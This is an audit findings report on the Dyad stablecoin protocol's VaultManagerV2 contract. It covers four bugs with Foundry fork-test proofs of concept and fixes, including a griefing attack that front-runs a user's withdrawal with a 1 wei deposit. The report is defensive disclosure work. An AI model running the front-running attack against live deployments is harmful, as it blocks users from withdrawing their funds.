# Dyad - Findings Report
Prepared by: Roberto Delgado Ferrezuelo

# Table of contents

- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Liquidators are not receiving the full 20% bonus due to oversight in collateral calculation](#h-1-liquidators-are-not-receiving-the-full-20-bonus-due-to-oversight-in-collateral-calculation)
    - [\[H-2\] Incorrect license check in `VaultManagerV2::addKerosene` and `VaultManagerV2::getKeroseneValue`](#h-2-incorrect-license-check-in-vaultmanagerv2addkerosene-and-vaultmanagerv2getkerosenevalue)
    - [\[H-3\] Kerosine's withdrawal should be executed separately](#h-3-kerosines-withdrawal-should-be-executed-separately)
  - [Medium](#medium)
    - [\[M-1\] Incorrect logic in keeping track of users' deposits allows attackers to prevent users withdrawals by frontrunning their transactions](#m-1-incorrect-logic-in-keeping-track-of-users-deposits-allows-attackers-to-prevent-users-withdrawals-by-frontrunning-their-transactions)

# Findings

## High

### [H-1] Liquidators are not receiving the full 20% bonus due to oversight in collateral calculation

#### Summary
Despite the documentation stating that liquidators should receive a 20% bonus of the liquidated user's collateral, the current implementation in `VaultManagerV2::liquidate` overlooks the inclusion of kerosene collateral in this calculation.

#### Impact
The kerosene token serves as an endogenous collateral, with its value tied to the excess TVL above the minted dyad. Users are mandated to maintain at least the same amount as the minted dyad of exogenous collateral in the vaults, with the ability to hold kerosene for the remainder collateral needed for the minimum CR level. Neglecting to consider this in the calculation may disincentivize users from initiating liquidations, as the compensation typically won't cover associated transaction costs. Delayed liquidations could result in bad debt and price instability. A PoC can elucidate this issue further. To execute it, adjustments need to be made, such as using `OracleMock` for the wETH vault to manipulate the price and licensing the kerosene vaults through the `Licenser`. Additionally, include the mainnet RPC URL in a .env file and use the command `forge test --mt test_liquidationCompensation --fork-url $MAINNET_RPC_URL`.

<details>
<summary>Code</summary>

Place this in `v2.t.sol`.

```javascript

    function bobAddLiquidity() public {
        uint256 bobPrivateKey = 0xB0B;
        address bob = vm.addr(bobPrivateKey);
        vm.deal(bob, 1400_000 ether);

        vm.startPrank(bob);

        IWETH(MAINNET_WETH).deposit{value: 700_000 ether}();

        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(bob));

        contracts.vaultManager.add(id, address(contracts.ethVault));

        contracts.vaultManager.addKerosene(
            id,
            address(contracts.unboundedKerosineVault) // Assume the vault licenser is used instead of kerosinemanager
        );

        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            700_000 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            700_000 ether
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Kerosine(MAINNET_KEROSENE).transfer(bob, 0.5 ether);
        vm.startPrank(bob);
        contracts.kerosene.approve(address(contracts.vaultManager), 0.5 ether);
        contracts.vaultManager.deposit(
            id,
            address(contracts.unboundedKerosineVault),
            0.5 ether
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(
            address(contracts.vaultManager)
        );

        vm.prank(bob);
        contracts.vaultManager.mintDyad(id, 2_000 ether, bob);
    }
    function test_liquidationCompensation() public {
        bobAddLiquidity();
        address alice = makeAddr("alice");
        vm.deal(alice, 2 ether); // Alice will mint 2,000 USD dyad backed by 2,000 USD wETH and ~1000 USD kerosine

        vm.startPrank(alice);

        IWETH(MAINNET_WETH).deposit{value: 1 ether}();

        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(alice));

        contracts.vaultManager.add(id, address(contracts.ethVault));

        contracts.vaultManager.addKerosene(
            id,
            address(contracts.unboundedKerosineVault)
        );

        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            1 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            1 ether
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Kerosine(MAINNET_KEROSENE).transfer(alice, 50 ether);

        vm.startPrank(alice);
        contracts.kerosene.approve(address(contracts.vaultManager), 50 ether);
        contracts.vaultManager.deposit(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether
        );
        contracts.vaultManager.mintDyad(id, 2_000 ether, alice);
        vm.stopPrank();

        // Collateral value: Exo: 2000, Endo~1420, Dyad: 2000

        // ETH price tanks, the user becomes undercollaterized and the liquidator just receives the exogenous collateral
        // Collateral value: Exo: 1500, Endo~1000, Dyad: 2000
        contracts.oracleMock.setPrice(1_500 ether);
        uint256 bobPrivateKey = 0xB0B;
        address bob = vm.addr(bobPrivateKey);
        vm.startPrank(bob);

        uint keroseneBobBefore = contracts.unboundedKerosineVault.id2asset(
            id - 1
        );
        contracts.vaultManager.liquidate(id, id - 1);
        assertEq(
            contracts.unboundedKerosineVault.id2asset(id - 1),
            keroseneBobBefore
        );
    }
```
</details>


#### Recommended mitigation
Rectify the collateral calculation by incorporating the kerosene vaults. Since `VaultManagerV2::liquidate` initiates fund movement rather than withdrawal, even if the liquidated user holds kerosene collateral in the bounded vault, it shouldn't pose an issue.

```diff
function liquidate(
        uint id,
        uint to
    ) external isValidDNft(id) isValidDNft(to) {
        uint cr = collatRatio(id);
        if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();
        dyad.burn(id, msg.sender, dyad.mintedDyad(address(this), id));

        uint cappedCr = cr < 1e18 ? 1e18 : cr;
        uint liquidationEquityShare = (cappedCr - 1e18).mulWadDown(
            LIQUIDATION_REWARD
        );
        uint liquidationAssetShare = (liquidationEquityShare + 1e18).divWadDown(
            cappedCr
        );
        uint numberOfVaults = vaults[id].length();
        for (uint i = 0; i < numberOfVaults; i++) {
            Vault vault = Vault(vaults[id].at(i));
            uint collateral = vault.id2asset(id).mulWadUp(
                liquidationAssetShare
            );
            vault.move(id, to, collateral);
        }

+       numberOfVaults = vaultsKerosene[id].length();
+       for (uint i = 0; i < numberOfVaults; i++) {
+           Vault vault = Vault(vaultsKerosene[id].at(i));
+           uint collateral = vault.id2asset(id).mulWadUp(
+               liquidationAssetShare
+           );
+           vault.move(id, to, collateral);
+       }
        emit Liquidate(id, msg.sender, to);
    }
```

### [H-2] Incorrect license check in `VaultManagerV2::addKerosene` and `VaultManagerV2::getKeroseneValue`
#### Summary
According to the [explanatory introductory video](https://www.youtube.com/watch?v=ok4CBaqEajM), `KerosineManager.sol` governs the TVL calculation for determining the kerosine price. Consequently, the TVL calculation should exclude kerosine vaults. However, if the vault's license is checked against `KerosineManager.sol`, it necessitates inclusion in the calculation to enable users to deposit kerosine into the vaults.
#### Impact
This would trigger a revert because the function `Vault.kerosine.unbounded::assetPrice` retrieves oracle decimals from the vaults added in the kerosine manager. Since the kerosine price is deterministically calculated in the same contract, attempting to read the oracle decimals would result in a revert, affecting all functionalities reliant on this value. Refer to the PoC below for clarification.

<details>
<summary>Code</summary>

Place this in `v2.t.sol` and run `forge test --mt test_revertKerosenePriceCalculation --fork-url $MAINNET_RPC_URL`.

```javascript
    function test_revertKerosenePriceCalculation() public {
        address bob = makeAddr("bob");
        vm.deal(bob, 700_001 ether);

        vm.startPrank(bob);

        IWETH(MAINNET_WETH).deposit{value: 700_000 ether}();

        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(bob));

        contracts.vaultManager.add(id, address(contracts.ethVault));
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        contracts.kerosineManager.add(
            address(contracts.unboundedKerosineVault)
        );

        vm.startPrank(bob);
        contracts.vaultManager.addKerosene(
            id,
            address(contracts.unboundedKerosineVault)
        );
        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            700_000 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            700_000 ether
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Kerosine(MAINNET_KEROSENE).transfer(bob, 50 ether);

        vm.startPrank(bob);
        contracts.kerosene.approve(address(contracts.vaultManager), 50 ether);
        contracts.vaultManager.deposit(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether
        );

        vm.expectRevert();
        contracts.vaultManager.getKeroseneValue(id);
    }

```

</details>

#### Recommended mitigation
Validate the license of the kerosine vaults always using the `Licenser.sol`, such as in the function `VaultManagerV2::addKerosene`:

```diff
    function addKerosene(uint id, address vault) external isDNftOwner(id) {
        if (vaultsKerosene[id].length() >= MAX_VAULTS_KEROSENE)
            revert TooManyVaults();
-       if (!keroseneManager.isLicensed(vault)) revert VaultNotLicensed();
+       if (!vaultLicenser.isLicensed(vault)) revert VaultNotLicensed();
        if (!vaultsKerosene[id].add(vault)) revert VaultAlreadyAdded();
        emit Added(id, vault);
    }

```

### [H-3] Kerosine's withdrawal should be executed separately
#### Summary
This finding relates to two issues in the withdrawal process of the kerosine. First, since the function `VaultManagerV2::withdraw` is reading the oracle decimals from the vault and the kerosine vaults do not implement it, the transaction will revert (same problem in `VaultManagerV2::redeemDyad`). And second, when substracting the value to be withdrawn to the USD value of the non kerosene collateral it may result in a revert if the user is holding less exogenous collateral than the value of the sum of the minted dyad and the kerosine being withdrawn. So even if the user's collateral is above the minimum requirements the transaction would still revert.

```javascript
  function withdraw(
    uint    id,
    address vault,
    uint    amount,
    address to
  ) 
    public
      isDNftOwner(id)
  {
    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
    uint dyadMinted = dyad.mintedDyad(address(this), id);
    Vault _vault = Vault(vault);
    uint value = amount * _vault.assetPrice() 
                  * 1e18 
@>                / 10**_vault.oracle().decimals() 
                  / 10**_vault.asset().decimals();
@>  if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat();
    _vault.withdraw(id, to, amount);
    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); 
  }
```

#### Impact
Attempting to withdraw kerosine from the unbounded vault will result in a reversion in both cases. Refer to the PoC below for the first case explained. This assumes that kerosine vaults are licensed through the vault licenser.

<details>
<summary>Code</summary>

Place this in `v2.t.sol` and run `forge test --mt test_withdrawReverts --fork-url $MAINNET_RPC_URL`.

```javascript
    function test_withdrawReverts() public {
        // For this it is assumed that kersoine vaults are licensed through the vault licenser and not the kerosine manager
        address bob = makeAddr("bob");
        vm.deal(bob, 700_001 ether);

        vm.startPrank(bob);

        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(bob));

        IWETH(MAINNET_WETH).deposit{value: 700_000 ether}();

        contracts.vaultManager.add(id, address(contracts.ethVault));

        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            700_000 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            700_000 ether
        );

        contracts.vaultManager.addKerosene(
            id,
            address(contracts.unboundedKerosineVault)
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Kerosine(MAINNET_KEROSENE).transfer(bob, 50 ether);

        vm.startPrank(bob);
        contracts.kerosene.approve(address(contracts.vaultManager), 50 ether);
        contracts.vaultManager.deposit(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether
        );
        vm.roll(block.number + 1);
        vm.expectRevert();
        contracts.vaultManager.withdraw(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether,
            bob
        );
    }
```
</details>

Furthermore, if it is desired to verify that the withdrawal will revert in the second scenario, the oracle decimals can be hardcoded to match those utilized by the kerosene vault. Then, execute the following code:

<details>

<summary>Code</summary>

Place this in `v2.t.sol` and run `forge test --mt test_withdrawRevertsCollateral --fork-url $MAINNET_RPC_URL`.

```javascript
    function test_withdrawRevertsCollateral() public {
        // For this it is assumed that kersoine vaults are licensed through the vault licenser and not the kerosine manager
        address bob = makeAddr("bob");
        vm.deal(bob, 700_001 ether);

        vm.startPrank(bob);

        IWETH(MAINNET_WETH).deposit{value: 700_000 ether}();

        uint idbob = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(bob));

        contracts.vaultManager.add(idbob, address(contracts.ethVault));

        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            700_000 ether
        );
        contracts.vaultManager.deposit(
            idbob,
            address(contracts.ethVault),
            700_000 ether
        );
        vm.stopPrank();

        address alice = makeAddr("alice");

        vm.deal(alice, 2 ether);

        vm.startPrank(alice);

        IWETH(MAINNET_WETH).deposit{value: 1 ether}();

        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(alice));

        contracts.vaultManager.add(id, address(contracts.ethVault));

        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            1 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            1 ether
        );

        contracts.vaultManager.addKerosene(
            id,
            address(contracts.unboundedKerosineVault)
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Kerosine(MAINNET_KEROSENE).transfer(alice, 50 ether);

        vm.startPrank(alice);
        contracts.kerosene.approve(address(contracts.vaultManager), 50 ether);
        contracts.vaultManager.deposit(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether
        );
        vm.stopPrank();

        vm.prank(MAINNET_OWNER);
        Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(
            address(contracts.vaultManager)
        );

        vm.startPrank(alice);
        contracts.vaultManager.mintDyad(id, 1_000 ether, alice);

        console.log(contracts.unboundedKerosineVault.getUsdValue(id)); //1423$ kerosine + 1000$ dyad > 2000$ wETH; 2000$wETH>1.5*1000$ dyad
        vm.roll(block.number + 1);
        vm.expectRevert(IVaultManager.NotEnoughExoCollat.selector);
        contracts.vaultManager.withdrawKerosine(
            id,
            address(contracts.unboundedKerosineVault),
            50 ether,
            alice
        );
    }
```

</details>

#### Recommended mitigation
A possible remediation could involve implementing a separate withdraw function specifically for the kerosine vault, utilizing the same number of decimals as employed by the vault to calculate the price and removing the check for the exogenous collateral since it will remain unchanged and the only factor that could compromise the user's position is the collateral ratio. Also adjust the function `VaultManagerV2::redeemDyad` accordingly.

```javascript
    function withdrawKerosine(
        uint id,
        address vault,
        uint amount,
        address to
    ) public isDNftOwner(id) {
        if (idToBlockOfLastDeposit[id] == block.number)
            revert DepositedInSameBlock();
        uint dyadMinted = dyad.mintedDyad(address(this), id);
        Vault _vault = Vault(vault);
        uint kerosineVaultDecimals = 8;
        uint value = (amount * _vault.assetPrice() * 1e18) /
            10 ** kerosineVaultDecimals /
            10 ** _vault.asset().decimals();
        _vault.withdraw(id, to, amount);
        if (collatRatio(id) < MIN_COLLATERIZATION_RATIO) revert CrTooLow();
    }
```
## Medium

### [M-1] Incorrect logic in keeping track of users' deposits allows attackers to prevent users withdrawals by frontrunning their transactions

#### Summary
In the latest version of the vault manager, users cannot deposit and withdraw within the same block. However, the current implementation of handling this restriction is flawed. The mapping `VaultManagerV2::idToBlockOfLastDeposit` tracks the block number of the last deposit for a given vault ID, but it does not keep track of the identity of the depositor. This oversight allows attackers to repeatedly frontrun transactions of the actual vault owner by calling `VaultManagerV2::deposit`, resetting the mapping `VaultManagerV2::idToBlockOfLastDeposit` and preventing the owner's withdrawal.

```javascript
    function deposit(
        uint id,
        address vault,
        uint amount
    ) external isValidDNft(id) {
@>      idToBlockOfLastDeposit[id] = block.number;
        Vault _vault = Vault(vault);
        _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);
        _vault.deposit(id, amount);
    }

    /// @inheritdoc IVaultManager
    function withdraw(
        uint id,
        address vault,
        uint amount,
        address to
    ) public isDNftOwner(id) {
@>      if (idToBlockOfLastDeposit[id] == block.number)
@>          revert DepositedInSameBlock();
        ...
```

#### Proof of Concept
The following code illustrates a scenario where Bob (the victim) deposits WETH into the vault and attempts to withdraw it the next block. However, Alice detects Bob's transaction in the mempool and frontruns it by calling `VaultManagerV2::deposit`, setting Bob's vault address and paying a higher fee, enticing miners to prioritize her transaction. 

<details>
<summary>Code</summary>

Place this in `v2.t.sol` and run `forge test --mt test_attackerFrontrunsWithdrawal --fork-url $MAINNET_RPC_URL`.

```javascript
     function test_attackerFrontrunsWithdrawal() public {
        // Bob (victim)
        address bob = makeAddr("bob");
        // Alice (attacker)
        address alice = makeAddr("alice");
        // Give some ether to create the vault to Bob
        vm.deal(bob, 2 ether);
        vm.deal(alice, 1 ether);
        vm.prank(bob);
        // Mint ERC-20 tokens for Alice and Bob
        IWETH(MAINNET_WETH).deposit{value: 1 ether}();
        vm.prank(alice);
        IWETH(MAINNET_WETH).deposit{value: 1 ether}();
        // Bob creates the vault and deposits some WETH on it
        vm.startPrank(bob);
        uint id = DNft(MAINNET_DNFT).mintNft{value: 1 ether}(address(bob));
        contracts.vaultManager.add(id, address(contracts.ethVault));
        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            1 ether
        );
        contracts.vaultManager.deposit(
            id,
            address(contracts.ethVault),
            1 ether
        );
        vm.stopPrank();
        // Next block, Bob wants to withdraw the collateral, however Alice sees the tx on the mempool, pays a little extra fee and frontruns Bob's tx depositing just 1 wei into his vault
        vm.roll(block.number + 1);
        vm.startPrank(alice);
        WETH(payable(MAINNET_WETH)).approve(
            address(contracts.vaultManager),
            1 ether
        );
        uint gasBefore = gasleft();
        contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 wei);
        uint gasAfter = gasleft();
        vm.stopPrank();
        // Alice needs to spend 9818 gas for the attack + 1 wei in WETH
        console.log("Gas spent by Alice: %d", gasBefore - gasAfter);
        // Bob's tx reverts
        vm.expectRevert(IVaultManager.DepositedInSameBlock.selector);
        vm.prank(bob);
        contracts.vaultManager.withdraw(
            id,
            address(contracts.ethVault),
            1e22,
            bob
        );
    }
```
</details>

It's noteworthy that the cost associated with the attack can be as low as 9818 units of gas and 1 wei of the ERC-20 token, primarily comprising the transaction fee.

#### Tools Used
Foundry and manual review.

#### Recommended Mitigation Steps
Implement access control in `VaultManagerV2::deposit`, such as the modifier `isDNftOwner(id)`:

```diff
function deposit(
        uint id,
        address vault,
        uint amount
-   ) external isValidDNft(id) {
+   ) external isDNftOwner(id) {
        idToBlockOfLastDeposit[id] = block.number;
        Vault _vault = Vault(vault);
        _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);
        _vault.deposit(id, amount);
    }
```

Alternatively, if allowing different users to deposit into vaults they don't own is desired, slightly adjust the mapping `VaultManagerV2::idToBlockOfLastDeposit` to assign a block stamp per vault ID per address:

```diff
...
-   mapping(uint => uint) public idToBlockOfLastDeposit;
+   mapping(uint => mapping(address => uint)) public idToBlockOfLastDeposit;
...

    function deposit(
        uint id,
        address vault,
        uint amount
    ) external isValidDNft(id) {
-       idToBlockOfLastDeposit[id] = block.number;  
+       idToBlockOfLastDeposit[id][msg.sender] = block.number;
        Vault _vault = Vault(vault);
        _vault.asset().safeTransferFrom(msg.sender, address(vault), amount);
        _vault.deposit(id, amount);
    }

    /// @inheritdoc IVaultManager
    function withdraw(
        uint id,
        address vault,
        uint amount,
        address to
    ) public isDNftOwner(id) {
-       if (idToBlockOfLastDeposit[id] == block.number)
+       if (idToBlockOfLastDeposit[id][msg.sender] == block.number)
            revert DepositedInSameBlock();
    ...
```


### Time spent:
20 hours